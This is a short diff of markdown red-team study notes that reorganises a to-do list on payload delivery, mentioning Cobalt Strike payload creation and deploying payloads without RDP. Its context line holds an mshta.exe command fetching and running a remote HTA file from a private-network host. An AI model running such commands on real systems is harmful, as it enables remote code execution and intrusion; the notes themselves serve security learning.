@@ -65,13 +65,11 @@ mshta.exe http://10.254.252.3:8000/app.hta
 ```
 
 ----
-### Executing Techniques
-
-Link to Heading
-and create 2 - Payloads & Execution Tech 
 
 #### Notes | Bonus
 - Create Links
+	- Link to Heading
+	- Create 2 - Payloads & Execution Tech 
 - Bonus RT Sections 
 	- Learn to deploy payload without RDP 
 	- Learn to leverage Cobalt strike for payload creation
